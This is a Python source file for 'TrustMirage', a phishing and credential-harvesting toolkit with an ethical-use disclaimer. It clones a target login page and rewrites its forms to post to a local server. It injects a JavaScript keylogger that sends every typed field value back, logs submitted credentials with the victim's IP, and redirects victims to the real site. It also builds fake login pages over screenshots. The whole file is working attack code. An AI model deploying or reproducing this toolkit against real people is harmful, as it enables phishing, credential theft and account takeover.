#!/usr/bin/env python3
"""
TrustMirage - Phishing and Credential Harvesting Toolkit
By koreyhacks_

Purpose: Ethical hacking tool for phishing simulations, credential harvesting, 
         and security awareness training
"""

import os
import sys
import time
import argparse
import requests
import socket
import webbrowser
import threading
import re
import json
import base64
import logging
from datetime import datetime
from PIL import ImageGrab, Image
from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("trustmirage.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("TrustMirage")

# ASCII Art for the banner (simple version - the SVG would be displayed in the GUI version)
BANNER = """
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║  ████████╗██████╗ ██╗   ██╗███████╗████████╗                      ║
║  ╚══██╔══╝██╔══██╗██║   ██║██╔════╝╚══██╔══╝                      ║
║     ██║   ██████╔╝██║   ██║███████╗   ██║                         ║
║     ██║   ██╔══██╗██║   ██║╚════██║   ██║                         ║
║     ██║   ██║  ██║╚██████╔╝███████║   ██║                         ║
║     ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                         ║
║                                                                    ║
║  ███╗   ███╗██╗██████╗  █████╗  ██████╗ ███████╗                  ║
║  ████╗ ████║██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝                  ║
║  ██╔████╔██║██║██████╔╝███████║██║  ███╗█████╗                    ║
║  ██║╚██╔╝██║██║██╔══██╗██╔══██║██║   ██║██╔══╝                    ║
║  ██║ ╚═╝ ██║██║██║  ██║██║  ██║╚██████╔╝███████╗                  ║
║  ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  ║
║                                                                    ║
║  Phishing and Credential Harvesting Toolkit                        ║
║  By koreyhacks_                                                    ║
╚════════════════════════════════════════════════════════════════════╝
"""

class Harvester:
    """Main class for credential harvesting functionality"""
    
    def __init__(self, target_url=None, port=8080, output_dir="harvested"):
        self.target_url = target_url
        self.port = port
        self.output_dir = output_dir
        self.target_html = None
        self.target_domain = None
        self.server = None
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def fetch_target(self):
        """Fetch the target website HTML"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            response = requests.get(self.target_url, headers=headers)
            self.target_html = response.text
            self.target_domain = urlparse(self.target_url).netloc
            logger.info(f"Successfully fetched content from {self.target_url}")
            return True
        except Exception as e:
            logger.error(f"Error fetching target: {e}")
            return False
    
    def modify_html(self):
        """Modify the target HTML to redirect form submissions to our server"""
        if not self.target_html:
            logger.error("No target HTML to modify")
            return False
            
        try:
            soup = BeautifulSoup(self.target_html, 'html.parser')
            
            # Find all forms and modify them to submit to our server
            forms = soup.find_all('form')
            if not forms:
                logger.warning("No forms found in target HTML")
            
            for form in forms:
                original_action = form.get('action', '')
                
                # Store original action as a data attribute
                form['data-original-action'] = original_action
                
                # Set the action to our local server
                form['action'] = f"/submit"
                
                # Add a hidden field with the original action
                hidden_input = soup.new_tag('input')
                hidden_input['type'] = 'hidden'
                hidden_input['name'] = '_original_action'
                hidden_input['value'] = original_action
                form.append(hidden_input)
                
                # Add a hidden field with the target domain
                domain_input = soup.new_tag('input')
                domain_input['type'] = 'hidden'
                domain_input['name'] = '_target_domain'
                domain_input['value'] = self.target_domain
                form.append(domain_input)
            
            # Fix relative links
            for link in soup.find_all(['a', 'img', 'script', 'link']):
                for attr in ['href', 'src']:
                    if link.has_attr(attr) and not link[attr].startswith(('http', '//')):
                        if link[attr].startswith('/'):
                            link[attr] = f"https://{self.target_domain}{link[attr]}"
                        else:
                            link[attr] = f"{self.target_url.rstrip('/')}/{link[attr]}"
            
            # Insert our tracking script
            tracking_script = soup.new_tag('script')
            tracking_script.string = """
            document.addEventListener('DOMContentLoaded', function() {
                // Log keystrokes and form fields
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.addEventListener('input', function(e) {
                        const data = {
                            field_name: e.target.name || e.target.id || 'unnamed',
                            field_type: e.target.type,
                            field_value: e.target.value
                        };
                        fetch('/log', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(data)
                        });
                    });
                });
            });
            """
            soup.head.append(tracking_script)
            
            self.target_html = str(soup)
            logger.info("Successfully modified target HTML")
            return True
        except Exception as e:
            logger.error(f"Error modifying HTML: {e}")
            return False
    
    class HarvesterHTTPHandler(BaseHTTPRequestHandler):
        """HTTP request handler for the credential harvester"""
        
        def __init__(self, *args, harvester=None, **kwargs):
            self.harvester = harvester
            super().__init__(*args, **kwargs)
        
        def log_message(self, format, *args):
            """Override log_message to use our logger"""
            logger.info(f"{self.address_string()} - {format%args}")
        
        def do_GET(self):
            """Handle GET requests"""
            if self.path == '/' or self.path == '/index.html':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(self.harvester.target_html.encode())
            else:
                # Proxy other resources from the target site
                self.send_response(404)
                self.end_headers()
        
        def do_POST(self):
            """Handle POST requests"""
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            if self.path == '/submit':
                # Handle form submission
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{self.harvester.output_dir}/credentials_{timestamp}.txt"
                
                with open(filename, 'w') as f:
                    f.write(f"Time: {datetime.now()}\n")
                    f.write(f"Source IP: {self.client_address[0]}\n")
                    f.write(f"Target URL: {self.harvester.target_url}\n")
                    f.write(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
                    f.write("Form Data:\n")
                    f.write(post_data)
                    f.write("\n\n")
                
                logger.info(f"Credentials harvested and saved to {filename}")
                
                # Redirect to the original site
                self.send_response(302)
                self.send_header('Location', self.harvester.target_url)
                self.end_headers()
            
            elif self.path == '/log':
                # Handle keylogger data
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                log_file = f"{self.harvester.output_dir}/keylog.json"
                
                try:
                    data = json.loads(post_data)
                    with open(log_file, 'a') as f:
                        entry = {
                            'timestamp': timestamp,
                            'ip': self.client_address[0],
                            'data': data
                        }
                        f.write(json.dumps(entry) + "\n")
                    
                    self.send_response(200)
                    self.end_headers()
                except Exception as e:
                    logger.error(f"Error logging data: {e}")
                    self.send_response(500)
                    self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
    
    def start_server(self):
        """Start the phishing web server"""
        try:
            # Create a custom handler with a reference to this Harvester instance
            handler = lambda *args, **kwargs: self.HarvesterHTTPHandler(*args, harvester=self, **kwargs)
            
            self.server = HTTPServer(('0.0.0.0', self.port), handler)
            logger.info(f"Server started at http://localhost:{self.port}")
            
            # Print the address for accessing the phishing site
            local_ip = socket.gethostbyname(socket.gethostname())
            print(f"\n[+] Phishing site active at: http://{local_ip}:{self.port}")
            print(f"[+] Local URL: http://localhost:{self.port}")
            print("[+] Send the above URL to the target for phishing simulation")
            print("[+] Press Ctrl+C to stop the server")
            
            # Start the server in a separate thread
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop the phishing web server"""
        if self.server:
            self.server.shutdown()
            logger.info("Server stopped")


class ScreenshotCloner:
    """Class for cloning websites from screenshots using AI image recognition"""
    
    def __init__(self, output_dir="cloned"):
        self.output_dir = output_dir
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def take_screenshot(self):
        """Take a screenshot of the current screen"""
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"{self.output_dir}/screenshot_{timestamp}.png"
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved to {screenshot_path}")
            return screenshot_path
        except Exception as e:
            logger.error(f"Error taking screenshot: {e}")
            return None
    
    def clone_from_screenshot(self, screenshot_path):
        """
        Clone a website from a screenshot
        
        This is a placeholder for the real functionality which would require
        integration with AI services to analyze the screenshot and generate HTML
        """
        try:
            # In a real implementation, this would:
            # 1. Use OCR to extract text
            # 2. Use image recognition to identify UI elements (forms, buttons, etc.)
            # 3. Generate HTML/CSS to closely mimic the layout
            
            # For now, we'll just create a basic template
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            html_path = f"{self.output_dir}/cloned_{timestamp}.html"
            
            with open(html_path, 'w') as f:
                f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>Cloned Website</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }}
        .screenshot-container {{
            position: relative;
            width: 100%;
        }}
        .screenshot {{
            width: 100%;
            height: auto;
        }}
        .form-overlay {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="screenshot-container">
        <img src="{screenshot_path}" class="screenshot" alt="Website Screenshot">
        <div class="form-overlay">
            <h2>Login Form</h2>
            <form action="/submit" method="post">
                <div>
                    <label for="username">Username/Email:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div>
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <div>
                    <button type="submit">Login</button>
                </div>
                <input type="hidden" name="_screenshot" value="{screenshot_path}">
            </form>
        </div>
    </div>
</body>
</html>""")
            
            logger.info(f"Cloned website saved to {html_path}")
            return html_path
        except Exception as e:
            logger.error(f"Error cloning from screenshot: {e}")
            return None


class TrustMirage:
    """Main class for the TrustMirage toolkit"""
    
    def __init__(self):
        self.harvester = None
        self.screenshot_cloner = None
    
    def display_banner(self):
        """Display the TrustMirage banner"""
        print("\033[95m" + BANNER + "\033[0m")
        print("\033[93m=== DISCLAIMER ===\033[0m")
        print("This tool is for ETHICAL HACKING and SECURITY TESTING purposes only.")
        print("Always obtain proper authorization before conducting security tests.")
        print("The author is not responsible for any misuse of this tool.")
        print("\033[93m================\033[0m\n")
    
    def display_menu(self):
        """Display the main menu"""
        print("\n\033[1mMAIN MENU\033[0m")
        print("1. Clone website from URL")
        print("2. Clone website from screenshot")
        print("3. View harvested credentials")
        print("4. Settings")
        print("5. Help")
        print("6. Exit")
        return input("\nSelect an option: ")
    
    def clone_from_url(self):
        """Clone a website from a URL"""
        target_url = input("\nEnter the target URL (e.g., https://example.com/login): ")
        port = input("Enter the port to run the server on [8080]: ") or 8080
        
        try:
            port = int(port)
            self.harvester = Harvester(target_url=target_url, port=port)
            
            print("\n[*] Fetching target website...")
            if not self.harvester.fetch_target():
                print("[!] Failed to fetch target website")
                return
            
            print("[*] Modifying HTML...")
            if not self.harvester.modify_html():
                print("[!] Failed to modify HTML")
                return
            
            print("[*] Starting phishing server...")
            if not self.harvester.start_server():
                print("[!] Failed to start server")
                return
            
            # Wait for Ctrl+C to stop
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Stopping server...")
                self.harvester.stop_server()
                print("[+] Server stopped")
        except Exception as e:
            logger.error(f"Error in clone_from_url: {e}")
            print(f"[!] Error: {e}")
    
    def clone_from_screenshot(self):
        """Clone a website from a screenshot"""
        self.screenshot_cloner = ScreenshotCloner()
        
        print("\n[*] Prepare to take a screenshot of the website you want to clone")
        input("Press Enter when ready...")
        
        print("[*] Taking screenshot in 3 seconds...")
        for i in range(3, 0, -1):
            print(f"{i}...")
            time.sleep(1)
        
        screenshot_path = self.screenshot_cloner.take_screenshot()
        if not screenshot_path:
            print("[!] Failed to take screenshot")
            return
        
        print(f"[+] Screenshot saved to {screenshot_path}")
        print("[*] Cloning website from screenshot...")
        
        html_path = self.screenshot_cloner.clone_from_screenshot(screenshot_path)
        if not html_path:
            print("[!] Failed to clone website")
            return
        
        print(f"[+] Cloned website saved to {html_path}")
        
        # Ask if user wants to start a server for the cloned site
        start_server = input("\nDo you want to start a server for the cloned site? (y/n): ").lower()
        
        if start_server == 'y':
            port = input("Enter the port to run the server on [8080]: ") or 8080
            try:
                port = int(port)
                
                # Create a simple HTTP server to serve the cloned site
                class ClonedSiteHandler(BaseHTTPRequestHandler):
                    def log_message(self, format, *args):
                        logger.info(f"{self.address_string()} - {format%args}")
                    
                    def do_GET(self):
                        if self.path == '/' or self.path == '/index.html':
                            self.send_response(200)
                            self.send_header('Content-type', 'text/html')
                            self.end_headers()
                            with open(html_path, 'rb') as f:
                                self.wfile.write(f.read())
                        elif self.path.endswith('.png'):
                            # Serve the screenshot
                            self.send_response(200)
                            self.send_header('Content-type', 'image/png')
                            self.end_headers()
                            with open(screenshot_path, 'rb') as f:
                                self.wfile.write(f.read())
                        else:
                            self.send_response(404)
                            self.end_headers()
                    
                    def do_POST(self):
                        if self.path == '/submit':
                            content_length = int(self.headers['Content-Length'])
                            post_data = self.rfile.read(content_length).decode('utf-8')
                            
                            # Save harvested credentials
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"harvested/credentials_{timestamp}.txt"
                            
                            with open(filename, 'w') as f:
                                f.write(f"Time: {datetime.now()}\n")
                                f.write(f"Source IP: {self.client_address[0]}\n")
                                f.write(f"From Screenshot: {screenshot_path}\n")
                                f.write(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
                                f.write("Form Data:\n")
                                f.write(post_data)
                                f.write("\n\n")
                            
                            logger.info(f"Credentials harvested and saved to {filename}")
                            
                            # Redirect to a success page
                            self.send_response(200)
                            self.send_header('Content-type', 'text/html')
                            self.end_headers()
                            self.wfile.write(b"""
                            <!DOCTYPE html>
                            <html>
                            <head>
                                <title>Login Successful</title>
                                <meta http-equiv="refresh" content="3;url=https://google.com">
                            </head>
                            <body>
                                <h1>Login Successful</h1>
                                <p>You will be redirected shortly...</p>
                            </body>
                            </html>
                            """)
                        else:
                            self.send_response(404)
                            self.end_headers()
                
                # Start the server
                server = HTTPServer(('0.0.0.0', port), ClonedSiteHandler)
                logger.info(f"Server started at http://localhost:{port}")
                
                # Print the address for accessing the phishing site
                local_ip = socket.gethostbyname(socket.gethostname())
                print(f"\n[+] Phishing site active at: http://{local_ip}:{port}")
                print(f"[+] Local URL: http://localhost:{port}")
                print("[+] Send the above URL to the target for phishing simulation")
                print("[+] Press Ctrl+C to stop the server")
                
                # Start the server
                try:
                    server.serve_forever()
                except KeyboardInterrupt:
                    print("\n[*] Stopping server...")
                    server.shutdown()
                    server.server_close()
                    print("[+] Server stopped")
            except Exception as e:
                logger.error(f"Error starting server: {e}")
                print(f"[!] Error: {e}")
    
    def view_harvested(self):
        """View harvested credentials"""
        if not os.path.exists("harvested"):
            print("\n[!] No harvested credentials found")
            return
        
        credentials_files = [f for f in os.listdir("harvested") if f.startswith("credentials_")]
        
        if not credentials_files:
            print("\n[!] No harvested credentials found")
            return
        
        print("\n\033[1mHARVESTED CREDENTIALS\033[0m")
        for i, file in enumerate(sorted(credentials_files, reverse=True)):
            print(f"{i+1}. {file}")
        
        choice = input("\nSelect a file to view (number) or 'b' to go back: ")
        if choice.lower() == 'b':
            return
        
        try:
            choice = int(choice) - 1
            if 0 <= choice < len(credentials_files):
                file_path = os.path.join("harvested", credentials_files[choice])
                
                with open(file_path, 'r') as f:
                    content = f.read()
                
                print(f"\n\033[1mFile: {credentials_files[choice]}\033[0m")
                print("\033[94m" + "=" * 40 + "\033[0m")
                print(content)
                print("\033[94m" + "=" * 40 + "\033[0m")
                
                input("\nPress Enter to continue...")
            else:
                print("[!] Invalid selection")
        except (ValueError, IndexError):
            print("[!] Invalid selection")
    
    def settings(self):
        """Configure tool settings"""
        print("\n\033[1mSETTINGS\033[0m")
        print("1. Change output directory")
        print("2. Configure logging")
        print("3. Configure server settings")
        print("4. Back to main menu")
        
        choice = input("\nSelect an option: ")
        
        if choice == '1':
            new_dir = input("Enter new output directory for harvested credentials: ")
            if new_dir:
                if not os.path.exists(new_dir):
                    try:
                        os.makedirs(new_dir)
                        print(f"[+] Created new directory: {new_dir}")
                    except Exception as e:
                        print(f"[!] Error creating directory: {e}")
                        return
                
                # Update the output directories
                if self.harvester:
                    self.harvester.output_dir = new_dir
                if self.screenshot_cloner:
                    self.screenshot_cloner.output_dir = new_dir
                
                print(f"[+] Output directory updated to: {new_dir}")
        
        elif choice == '2':
            print("\nLogging Options:")
            print("1. Debug (verbose)")
            print("2. Info (default)")
            print("3. Warning")
            print("4. Error")
            
            log_level = input("Select logging level: ")
            if log_level == '1':
                logger.setLevel(logging.DEBUG)
                print("[+] Logging level set to DEBUG")
            elif log_level == '2':
                logger.setLevel(logging.INFO)
                print("[+] Logging level set to INFO")
            elif log_level == '3':
                logger.setLevel(logging.WARNING)
                print("[+] Logging level set to WARNING")
            elif log_level == '4':
                logger.setLevel(logging.ERROR)
                print("[+] Logging level set to ERROR")
        
        elif choice == '3':
            default_port = 8080
            if self.harvester:
                default_port = self.harvester.port
            
            new_port = input(f"Enter default server port [{default_port}]: ") or default_port
            try:
                new_port = int(new_port)
                if self.harvester:
                    self.harvester.port = new_port
                print(f"[+] Default server port updated to: {new_port}")
            except ValueError:
                print("[!] Invalid port number")
    
    def show_help(self):
        """Show help information"""
        print("""
\033[1mTrustMirage Help\033[0m

TrustMirage is an ethical hacking toolkit for phishing simulations and security awareness training.

\033[1mMain Features:\033[0m
- Clone websites from URLs
- Clone websites from screenshots
- Harvest and analyze credentials
- Generate security reports

\033[1mUsage Guidelines:\033[0m
1. Always obtain proper authorization before conducting security tests
2. Document all testing activities
3. Use only for educational and legitimate security purposes
4. Never use for actual malicious activities

\033[1mLegal Disclaimer:\033[0m
This tool is provided for ethical hacking and security testing purposes only.
The author is not responsible for any misuse of this tool.
Unauthorized use of this tool against systems without proper permission may be illegal.
        """)
        input("\nPress Enter to continue...")
    
    def run(self):
        """Run the main application loop"""
        self.display_banner()
        
        while True:
            choice = self.display_menu()
            
            if choice == '1':
                self.clone_from_url()
            elif choice == '2':
                self.clone_from_screenshot()
            elif choice == '3':
                self.view_harvested()
            elif choice == '4':
                self.settings()
            elif choice == '5':
                self.show_help()
            elif choice == '6':
                print("\n[+] Exiting TrustMirage. Goodbye!")
                break
            else:
                print("[!] Invalid option, please try again")


if __name__ == "__main__":
    # Check for dependencies
    try:
        import PIL
        import bs4
        # All good
    except ImportError:
        print("[!] Missing dependencies. Please install required packages:")
        print("pip install pillow beautifulsoup4 requests")
        sys.exit(1)
    
    # Run the application
    app = TrustMirage()
    app.run()
